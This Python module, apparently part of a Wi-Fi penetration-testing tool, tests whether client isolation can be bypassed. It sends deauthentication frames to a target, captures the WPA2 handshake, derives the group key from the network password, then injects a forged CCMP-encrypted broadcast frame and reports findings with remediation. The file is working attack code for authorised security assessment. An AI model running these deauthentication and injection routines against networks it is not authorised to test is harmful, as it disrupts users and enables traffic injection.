"""GTK extraction + broadcast injection test.

Tests whether an attacker who knows the Wi-Fi password can extract the Group
Temporal Key (GTK) and inject broadcast frames that bypass client isolation.
This is the foundational AirSnitch primitive - if GTK injection works, the AP
forwards attacker-crafted broadcast frames to all clients.
"""

from __future__ import annotations

import hashlib
import hmac
import struct

from cryptography.hazmat.primitives.ciphers.aead import AESCCM
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from scapy.all import Dot11, Dot11Deauth, IP, ICMP

from airsnitch.attacks.base import BaseAttackTest
from airsnitch.config import DEAUTH_COUNT, HANDSHAKE_TIMEOUT
from airsnitch.core.packets import PacketEngine
from airsnitch.core.types import ClientInfo, Finding, NetworkContext, Severity
from airsnitch.safeguards.audit import AuditLogger


def _derive_pmk(password: str, ssid: str) -> bytes:
    """Derive PMK from passphrase and SSID via PBKDF2-SHA1."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=32,
        salt=ssid.encode(),
        iterations=4096,
    )
    return kdf.derive(password.encode())


def _prf_512(key: bytes, label: bytes, data: bytes) -> bytes:
    """PRF-512 as defined in IEEE 802.11i for PTK derivation."""
    result = b""
    for i in range(4):  # 512 bits = 4 * 160-bit HMAC-SHA1 blocks
        msg = label + b"\x00" + data + struct.pack("B", i)
        result += hmac.new(key, msg, hashlib.sha1).digest()
    return result[:64]  # 512 bits = 64 bytes


def _derive_ptk(pmk: bytes, ap_mac: bytes, sta_mac: bytes, anonce: bytes, snonce: bytes) -> bytes:
    """Derive PTK from PMK and handshake parameters."""
    mac_pair = min(ap_mac, sta_mac) + max(ap_mac, sta_mac)
    nonce_pair = min(anonce, snonce) + max(anonce, snonce)
    return _prf_512(pmk, b"Pairwise key expansion", mac_pair + nonce_pair)


def _extract_gtk_from_msg3(ptk: bytes, key_data: bytes) -> bytes | None:
    """Extract GTK from EAPOL message 3 Key Data using KEK (PTK[16:32]).

    After AES key unwrap, the result contains KDE (Key Data Encapsulation):
    DD + length + OUI(00:0F:AC) + data_type(1) + GTK.
    We parse the KDE to extract the raw GTK.
    """
    kek = ptk[16:32]
    try:
        unwrapped = aes_key_unwrap(kek, key_data)
    except Exception:
        return None

    # Parse KDE to find GTK: look for OUI 00:0F:AC type 01
    pos = 0
    while pos + 2 < len(unwrapped):
        element_id = unwrapped[pos]
        length = unwrapped[pos + 1]
        if pos + 2 + length > len(unwrapped):
            break
        body = unwrapped[pos + 2 : pos + 2 + length]
        # KDE: element_id=0xDD, OUI=00:0F:AC, type=01 (GTK KDE)
        if element_id == 0xDD and length >= 6 and body[:3] == b"\x00\x0f\xac" and body[3] == 0x01:
            # GTK KDE body: OUI(3) + type(1) + key_id_flags(2) + GTK
            return body[6:]
        pos += 2 + length

    # Fallback: if no KDE found, return raw unwrapped (may be direct GTK)
    return unwrapped if len(unwrapped) >= 16 else None


def _build_ccmp_aad(fc: int, addr1: bytes, addr2: bytes, addr3: bytes, sc: int) -> bytes:
    """Build AAD (Additional Authenticated Data) for CCMP per IEEE 802.11i-2004 Section 8.3.3.4.3.

    AAD = FC(masked, 2 bytes) || A1(6) || A2(6) || A3(6) || SC(masked, 2 bytes)
    FC mask: clear retry, pwrmgt, moredata, order bits; keep subtype, to/from-DS, protected
    SC mask: clear sequence number, keep fragment number
    """
    # Mask FC: keep protocol version, type, subtype, to/from-DS, more-fragments, protected
    # Clear: retry(bit 11), power-mgmt(bit 12), more-data(bit 13), order(bit 15)
    fc_masked = fc & 0x8FC7
    # Mask SC: keep fragment number (bits 0-3), clear sequence number (bits 4-15)
    sc_masked = sc & 0x000F
    return struct.pack("<H", fc_masked) + addr1 + addr2 + addr3 + struct.pack("<H", sc_masked)


def _ccmp_encrypt(gtk: bytes, plaintext: bytes, pn: int, bssid: bytes) -> tuple[bytes, bytes]:
    """CCMP-encrypt a payload using the GTK with proper nonce and AAD.

    Returns (encrypted_data_with_mic, pn_le_bytes).
    The CCM nonce is 13 bytes: Priority(1) || A2(6) || PN(6, big-endian).
    Per IEEE 802.11i-2004 Section 8.3.3.4.3.
    """
    tk = gtk[:16]  # Temporal Key: first 16 bytes of GTK

    # PN in little-endian for CCMP IV fields (PN0-PN5 in header)
    pn_le = struct.pack("<Q", pn)[:6]
    # PN in big-endian for CCM nonce
    pn_be = struct.pack(">Q", pn)[2:]  # 6 bytes big-endian

    # CCM nonce: Priority(1, =0 for non-QoS) || A2/BSSID(6) || PN(6, BE)
    nonce = b"\x00" + bssid + pn_be

    # Build AAD from the 802.11 header we will construct
    # Frame Control: Type=2(Data), Subtype=0, from-DS(0x02), Protected(0x40) = 0x0842
    fc = 0x0842
    addr1 = b"\xff\xff\xff\xff\xff\xff"  # broadcast DA
    addr3 = bssid  # SA
    sc = 0  # sequence control
    aad = _build_ccmp_aad(fc, addr1, bssid, addr3, sc)

    aesccm = AESCCM(tk, tag_length=8)
    ct = aesccm.encrypt(nonce, plaintext, aad)
    return ct, pn_le


def _mac_to_bytes(mac_str: str) -> bytes:
    return bytes.fromhex(mac_str.replace(":", ""))


class GTKInjectionTest(BaseAttackTest):
    name = "gtk_injection"
    description = "GTK-encrypted broadcast frame injection"

    def __init__(self, ctx: NetworkContext, engine: PacketEngine, audit: AuditLogger):
        super().__init__(ctx, engine, audit)
        self._monitor_was_active = False

    def preflight_check(self) -> tuple[bool, str]:
        if not self._ctx.password:
            return False, "Wi-Fi password required for GTK extraction"
        if not self._ctx.gateway_mac:
            return False, "Gateway MAC not discovered"
        if not self._ctx.ssid:
            return False, "SSID required for PMK derivation"
        return True, "Ready"

    def execute(self, target: ClientInfo) -> Finding:
        self._audit.log_test_start(self.name, target.mac)

        # Enable monitor mode for handshake capture and frame injection
        adapter = self._engine.adapter
        if adapter:
            self._monitor_was_active = adapter.monitor_active
            if not adapter.monitor_active:
                adapter.enable_monitor()

        # Step 0: Send deauth to force target re-authentication (handshake trigger)
        if adapter and self._ctx.gateway_mac:
            deauth = (
                Dot11(
                    type=0, subtype=12,
                    addr1=target.mac,
                    addr2=self._ctx.gateway_mac,
                    addr3=self._ctx.gateway_mac,
                )
                / Dot11Deauth(reason=7)
            )
            self._engine.inject_80211(deauth, count=DEAUTH_COUNT)
            self._audit.log_packet_send(self.name, f"deauth {target.mac}", DEAUTH_COUNT)

        # Step 1: Capture 4-way handshake to derive GTK
        gtk = self._extract_gtk()
        if gtk is None:
            finding = Finding(
                test_name=self.name,
                severity=Severity.INFO,
                confidence=0.0,
                description="Could not extract GTK from handshake",
                evidence="No 4-way handshake captured or key derivation failed",
                remediation="N/A",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False, "reason": "no_gtk"})
            return finding

        # Step 2: Craft CCMP-encrypted broadcast frame with ICMP probe
        if not target.ip:
            finding = Finding(
                test_name=self.name,
                severity=Severity.INFO,
                confidence=0.0,
                description="Target IP unknown, cannot craft probe",
                evidence="No IP address for target",
                remediation="N/A",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False, "reason": "no_target_ip"})
            return finding

        bssid = self._ctx.gateway_mac or "ff:ff:ff:ff:ff:ff"
        bssid_bytes = _mac_to_bytes(bssid)

        # Inner payload: unicast ICMP to target (broadcast at L2, unicast at L3)
        inner_payload = bytes(
            IP(src=self._ctx.gateway_ip or "0.0.0.0", dst=target.ip) / ICMP()
        )

        # CCMP-encrypt with GTK and real BSSID
        try:
            encrypted_data, pn_le = _ccmp_encrypt(gtk, inner_payload, pn=1, bssid=bssid_bytes)
        except Exception:
            finding = Finding(
                test_name=self.name,
                severity=Severity.INFO,
                confidence=0.0,
                description="CCMP encryption of broadcast frame failed",
                evidence="GTK may be invalid or wrong length for AES-CCM",
                remediation="N/A",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False, "reason": "ccmp_failed"})
            return finding

        # Build 802.11 data frame with CCMP header
        # FCfield=0x41: from-DS(0x02 in Dot11 flags) + Protected(0x40)
        broadcast_frame = Dot11(
            type=2, subtype=0,
            addr1="ff:ff:ff:ff:ff:ff",  # DA: broadcast
            addr2=bssid,                 # BSSID (transmitter)
            addr3=bssid,                 # SA
            FCfield=0x41,                # from-DS + Protected
        )

        # Build CCMP IV from PN (split LE layout per IEEE 802.11i)
        # IV: PN0, PN1, 0x00, ExtIV(0x20)|KeyID, PN2, PN3, PN4, PN5
        ccmp_hdr = bytes([
            pn_le[0], pn_le[1], 0x00, 0x20,  # ExtIV flag set, KeyID=0
            pn_le[2], pn_le[3], pn_le[4], pn_le[5],
        ])

        # Assemble: Dot11 header + CCMP IV + encrypted data (includes MIC)
        raw_frame = bytes(broadcast_frame) + ccmp_hdr + encrypted_data

        # Step 3: Inject via 802.11 (inject_80211 prepends RadioTap)
        from scapy.all import Raw as ScapyRaw
        self._engine.inject_80211(ScapyRaw(load=raw_frame), count=3)

        # Switch back to managed mode for L3 response capture
        if adapter and not self._monitor_was_active:
            try:
                adapter.disable_monitor()
            except Exception:
                pass

        # Sniff for ICMP reply from target (now in managed mode, BPF works on Ethernet)
        responses = self._engine.sniff_filtered(
            bpf_filter=f"icmp and src host {target.ip}",
            count=1,
            timeout=5,
        )

        if responses:
            finding = Finding(
                test_name=self.name,
                severity=Severity.CRITICAL,
                confidence=0.9,
                description=(
                    "GTK broadcast injection bypasses client isolation. "
                    "Attacker with Wi-Fi password can inject broadcast frames "
                    "received by all connected clients."
                ),
                evidence=f"ICMP response from {target.ip} ({target.mac}) after GTK-injected broadcast",
                remediation=(
                    "Upgrade AP firmware. Enable AP isolation at L2. "
                    "Use WPA3-Enterprise with per-client keys. "
                    "Deploy 802.1X with dynamic VLAN assignment."
                ),
            )
            self._audit.log_test_result(self.name, target.mac, {"success": True, "response_count": len(responses)})
        else:
            finding = Finding(
                test_name=self.name,
                severity=Severity.LOW,
                confidence=0.6,
                description="GTK broadcast injection did not elicit a response",
                evidence="No ICMP reply received within timeout",
                remediation="Client isolation may be effective, but further testing recommended",
            )
            self._audit.log_test_result(self.name, target.mac, {"success": False, "reason": "no_response"})

        return finding

    def _extract_gtk(self) -> bytes | None:
        """Capture 4-way handshake and derive GTK.

        1. Sniff EAPOL frames for 4-way handshake (monitor mode required)
        2. Derive PMK via PBKDF2-SHA1(passphrase, SSID, 4096)
        3. Extract ANonce/SNonce from messages 1 and 2
        4. Derive PTK via PRF-512
        5. Decrypt GTK from message 3 Key Data using KEK
        6. Parse KDE to extract raw GTK
        """
        from scapy.all import EAPOL

        eapol_frames = self._engine.sniff_filtered(
            bpf_filter="ether proto 0x888e",
            count=4,
            timeout=HANDSHAKE_TIMEOUT,
        )

        if len(eapol_frames) < 3:
            return None

        # Parse handshake frames for nonces and key data
        anonce: bytes | None = None
        snonce: bytes | None = None
        key_data: bytes | None = None
        sta_mac: str | None = None

        for frame in eapol_frames:
            if not frame.haslayer(EAPOL):
                continue
            raw = bytes(frame[EAPOL])
            # EAPOL header is 4 bytes: version(1) + type(1) + body_length(2)
            # Key Descriptor body starts at offset 4
            if len(raw) < 103:  # 4 (EAPOL header) + 99 (min key descriptor)
                continue
            key_body = raw[4:]  # Skip EAPOL header to get Key Descriptor

            # Key Descriptor layout:
            #   [0]     = descriptor type
            #   [1:3]   = key_info (2 bytes)
            #   [3:5]   = key_length
            #   [5:13]  = replay_counter
            #   [13:45] = nonce (32 bytes)
            #   [45:61] = key_iv
            #   [61:69] = key_rsc
            #   [69:77] = reserved
            #   [77:93] = key_mic (16 bytes)
            #   [93:95] = key_data_length
            #   [95:]   = key_data
            key_info = struct.unpack("!H", key_body[1:3])[0]
            nonce = key_body[13:45]

            # Message 1: pairwise + ack, no mic -> ANonce
            if (key_info & 0x0008) and (key_info & 0x0080) and not (key_info & 0x0100):
                anonce = nonce
            # Message 2: pairwise + mic, no ack -> SNonce + STA MAC
            elif (key_info & 0x0008) and (key_info & 0x0100) and not (key_info & 0x0080):
                snonce = nonce
                if hasattr(frame, "addr2"):
                    sta_mac = frame.addr2
            # Message 3: pairwise + ack + mic + encrypted -> Key Data
            elif (key_info & 0x0008) and (key_info & 0x0080) and (key_info & 0x0100):
                key_data_len = struct.unpack("!H", key_body[93:95])[0]
                if len(key_body) >= 95 + key_data_len:
                    key_data = key_body[95 : 95 + key_data_len]

        if anonce is None or snonce is None or key_data is None:
            return None
        if not sta_mac or not self._ctx.gateway_mac:
            return None
        if not self._ctx.password or not self._ctx.ssid:
            return None

        # Derive keys
        pmk = _derive_pmk(self._ctx.password, self._ctx.ssid)
        ap_mac_bytes = _mac_to_bytes(self._ctx.gateway_mac)
        sta_mac_bytes = _mac_to_bytes(sta_mac)
        ptk = _derive_ptk(pmk, ap_mac_bytes, sta_mac_bytes, anonce, snonce)

        # Extract GTK from message 3 key data (with KDE parsing)
        gtk = _extract_gtk_from_msg3(ptk, key_data)
        if gtk:
            self._ctx.gtk = gtk
        return gtk

    def cleanup(self) -> None:
        """Restore monitor mode to original state."""
        adapter = self._engine.adapter
        if adapter and not self._monitor_was_active and adapter.monitor_active:
            try:
                adapter.disable_monitor()
            except Exception:
                pass
